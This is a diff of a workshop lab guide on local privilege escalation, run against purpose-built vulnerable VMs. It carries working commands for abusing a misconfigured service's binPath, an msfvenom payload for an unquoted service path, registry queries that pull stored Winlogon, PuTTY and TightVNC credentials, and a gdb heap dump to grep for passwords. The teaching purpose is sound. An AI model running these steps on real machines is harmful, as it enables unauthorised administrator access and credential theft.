@@ -28,20 +28,21 @@ Install the Windows 7 VM via the ISO, similar to the Windows installation done p
 
 1. Login to the Windows VM using a user account that has administrator privileges.
 2. Ensure the Windows VM does not have a user account named 'user'. If it exists, delete it.
-3. Copy the following [setup script](https://github.com/sagishahar/lpeworkshop/blob/master/lpe_windows_setup.bat) (lpe_windows_setup.bat) to a writeable location on a Windows VM (the Desktop directory is fine). You can right click on the "Raw" button and "Save as..." a .bat file. Alternatively, perform a wget of the file:
+3.  Copy the following [setup script](https://github.com/sagishahar/lpeworkshop/blob/master/lpe\_windows\_setup.bat) (lpe\_windows\_setup.bat) to a writeable location on a Windows VM (the Desktop directory is fine). You can right click on the "Raw" button and "Save as..." a .bat file. Alternatively, perform a wget of the file:
+
     ```
     wget https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat -o lpe_windows_setup
     ```
 4. Right click on the copied setup file and ensure to select from the pop-up menu 'run as Administrator'. This will setup the Windows system for the subsequent exercises.
-5. Take note of the resulting output. One of the executed tasks is to create a new user account `user` with password `password321`.
+5.  Take note of the resulting output. One of the executed tasks is to create a new user account `user` with password `password321`.
 
-    ![](<../.gitbook/assets/lab-4-assets/1.png>)
-    
+    ![](../.gitbook/assets/lab-4-assets/1.png)
 6. Restart the Windows VM and login to `user`.
-7. Copy the following [Tools](https://drive.google.com/file/d/1Lgg3HXXltB7ZD3F5YSbRl6FX7h_mPzFU/view) 7z archive to the Desktop and extract it. You may need to download [7-zip](https://www.7-zip.org/download.html) to perform the extraction. The password is `lpeworkshop`. 
+7. Copy the following [Tools](https://drive.google.com/file/d/1Lgg3HXXltB7ZD3F5YSbRl6FX7h\_mPzFU/view) 7z archive to the Desktop and extract it. You may need to download [7-zip](https://www.7-zip.org/download.html) to perform the extraction. The password is `lpeworkshop`.
 
 {% hint style="info" %}
 If you have issues downloading 7-zip or WinRAR or otherwise have difficulty accessing certain webpages due to a `NET::ERR_CERT_DATE_INVALID` Error, you will need to perform the following:
+
 1. Open `certmgr.msc` by searching for it in the Windows search.
 2. Find and delete the `DST ROOT CA X3` certificate. This certificate will have expired around 30-Sept-2021.
 3. Download and install the [`ISGR ROOT`](https://letsencrypt.org/certs/isrgrootx1.der) certificate. Place this certificate in the "Trusted Root Certificate Authorities Folder".
@@ -57,39 +58,39 @@ Additionally, you may want to install the "Guest Additions/Tools" to improve you
 Each service has an Access Control List (ACL) that specifies specific permissions to a certain service.
 
 Some permissions are pretty harmful like being:
-* able to query the configuration of the service:
-`sc qc <service>`
-* able to check the current status of the service:
-`sc query <service>`
-* able to start and stop the service:
-`net start/stop <service>`
-* and change the configuration of the service:
-`sc config <service> <option>= <value>`
+
+* able to query the configuration of the service: `sc qc <service>`
+* able to check the current status of the service: `sc query <service>`
+* able to start and stop the service: `net start/stop <service>`
+* and change the configuration of the service: `sc config <service> <option>= <value>`
 
 If a user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own, including a reverse shell. Let's discover the running services with any service enumeration tool, such as [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) or by typing `Get-Service`. You will find an exhaustive list of services, one of which is the `daclsvc` service.
 
 Using the `accesschk.exe` tool that you downloaded in the `Tools` folder, you can look at which services the user `user` has permissions over:
+
 ```
 accesschk64.exe -uwcqv "user" *
 ```
 
-![](<../.gitbook/assets/lab-4-assets/2.png>)
+![](../.gitbook/assets/lab-4-assets/2.png)
 
 We've confirmed that `user` has RW (read-write) permissions over the `daclsvc` service, including the `SERVICE_CHANGE_CONFIG` permission which grants the caller the right to change the executable file that the system runs. Thus, this permission should be granted only to administrators. What we can do now is elevate the permissions of this user to administrator through this misconfigured service. This can be done via:
+
 ```
 sc config daclsvc binPath= "net localgroup administrators user /add"
 ```
+
 {% hint style="info" %}
-Note the space after `binPath= `
+Note the space after `binPath=`
 {% endhint %}
 
 Confirm that this user's permissions have been elevated via `net localgroup administrators`. You should see `user` in the administrators list.
 
-![](<../.gitbook/assets/lab-4-assets/3.png>)
+![](../.gitbook/assets/lab-4-assets/3.png)
 
-Using the command `sc qc daclsvc`, we can also see the binary path that we have altered for the `daclsvc` service. Note the BINARY_PATH_NAME variable.
+Using the command `sc qc daclsvc`, we can also see the binary path that we have altered for the `daclsvc` service. Note the BINARY\_PATH\_NAME variable.
 
-![](<../.gitbook/assets/lab-4-assets/4.png>)
+![](../.gitbook/assets/lab-4-assets/4.png)
 
 {% hint style="info" %}
 With this service's misconfigured permissions, we can actually modify the binary path to contain whatever commands we want, such as the running of a reverse shell. You simply change the `binPath=` to be the path to a reverse shell executable, then the reverse shell will start whenever the service is called. You can manually start the service with `net start daclsvc`. Try this out as an exercise!
@@ -103,16 +104,17 @@ Services whose executable path contains spaces and isn't enclosed within quotes 
 
 For this exercise, there will be a vulnerable service called `unquotedsvc` in your system. Inspect its configuration with `sc qc unquotedsvc`.
 
-![t](<../.gitbook/assets/lab-4-assets/6.png>)
+![t](../.gitbook/assets/lab-4-assets/6.png)
 
 We see that the binary path is missing the quotations around it. The path here is to the service .exe. Take note of the directory path itself, as this is where we can drop our malicious executable.
 
 We are going to create a malicious executatble that takes advantage of this vulnerability. This executable will performm a similar task to 4.2.1; it will grant the user administrator permissions. We will create this .exe in Kali with the command:
+
 ```
 msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
 ```
 
-![](<../.gitbook/assets/lab-4-assets/5.png>)
+![](../.gitbook/assets/lab-4-assets/5.png)
 
 The name `common.exe` is innocuous enough. Copy this .exe over to the Windows VM and place it within the `C:\Program Files\Unquoted Path Service` directory. In cmd, execute the service via `net start unquotedsvc`.
 
@@ -129,7 +131,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Defaul
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 ```
 
-![](<../.gitbook/assets/lab-4-assets/7.png>)
+![](../.gitbook/assets/lab-4-assets/7.png)
 
 We see the credentials of our user with non-administrator permissions in plaintext. We can also try look at any credentials stored by PuTTY, a popular SSH client. For this lab, there is a PuTTY session open, for which we can have a look at the login credentials of a user for this session:
 
@@ -138,7 +140,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v Pro
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword
 ```
 
-![](<../.gitbook/assets/lab-4-assets/8.png>)
+![](../.gitbook/assets/lab-4-assets/8.png)
 
 We can see the username and password for our account clearly as plaintext. Not good! Let's try another SSH service, TightVNC. Query the registry with:
 
@@ -146,15 +148,15 @@ We can see the username and password for our account clearly as plaintext. Not g
 reg query HKEY_CURRENT_USER\Software\TightVNC\Server
 ```
 
-![](<../.gitbook/assets/lab-4-assets/9.png>)
+![](../.gitbook/assets/lab-4-assets/9.png)
 
-We see two passwords, both seem to be encrypted in some way. We can try and decrypt them using  the `vncpwd` tool:
+We see two passwords, both seem to be encrypted in some way. We can try and decrypt them using the `vncpwd` tool:
 
 ```
 C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]
 ```
 
-![](<../.gitbook/assets/lab-4-assets/10.png>)
+![](../.gitbook/assets/lab-4-assets/10.png)
 
 We see the password `pass123` is returned for one of the given passwords. You can do the same with the other password. Clearly, these tools are able to uncover passwords from registry.
 
@@ -172,7 +174,7 @@ set FTPPASS password321
 run
 ```
 
-![](<../.gitbook/assets/lab-4-assets/11.png>)
+![](../.gitbook/assets/lab-4-assets/11.png)
 
 The `user` and `password321` here are the credentials to be used when connecting to the server. Note that they are also they user credentials of the Linux VM user account. We can then connect to this server on our Linux via:
 
@@ -182,58 +184,53 @@ user
 password321
 ```
 
-![](<../.gitbook/assets/lab-4-assets/12.png>)
+![](../.gitbook/assets/lab-4-assets/12.png)
 
 After which, exit the ftp using ctrl+z or cmd+z. Let's now try to look at the heap of the ftp service we just engaged with and search inside of it for some credentials. Let's take a look at any running ftp services:
+
 ```
 ps -ef | grep ftp
 ```
 
-![](<../.gitbook/assets/lab-4-assets/13.png>)
+![](../.gitbook/assets/lab-4-assets/13.png)
 
 Make note of the PID of the ftp process. Now to get the memory dump:
+
 ```
 gdb -p [FTP PID]
 info proc mappings
 ```
 
-![](<../.gitbook/assets/lab-4-assets/15.png>)
+![](../.gitbook/assets/lab-4-assets/15.png)
 
-Make note of the start and end memory addresses of the [heap]. Press 'q' to return, then enter:
+Make note of the start and end memory addresses of the \[heap]. Press 'q' to return, then enter:
+
 ```
 dump memory /tmp/mem [Start Address] [End Address]
 ```
+
 This will dump the memory to a file - /tmp/mem. We can then inspect this file to see if there are any password related things in there:
+
 ```
 strings /tmp/mem | grep passw
 ```
 
-![](<../.gitbook/assets/lab-4-assets/16.png>)
+![](../.gitbook/assets/lab-4-assets/16.png)
 
 We see the credentials `root` and `password123` in plaintext, which are the root credentials for the Linux VM.
 
 ### 4.3.2 File Permissions (SUID Binary - Environment Variables #1)
 
-
-
-
-
-
 ## 4.X Summary
 
 add summary...
 
+Next up, web security.
 
-
-Next up, Active Directory
-
-{% hint style="info" %}
-Please preview the next lab setup guide, as you will need to set up a new VM - Windows Server 2019. The size of the ISO is about 5GB, so it is a good idea to download that beforehand and get started on its installation (took me half an hour to get it set up FYI).
-{% endhint %}
+**Preparation**: We will be using docker to host web services for testing. It should be already loaded on Kali, but if it isn't please have it ready.
 
 {% hint style="warning" %}
 M1/M2 users: setting up the Windows Server 2019 is extremely slow due to emulation (\~2 hours), but it is a good learning exercise. So you should try doing this before coming to the lab.
 
 I also provide you a preconfigured Windows Server 2019 image for UTM that you can download (see Lab 5 for details), but please note the image size is 10GB.
 {% endhint %}
-
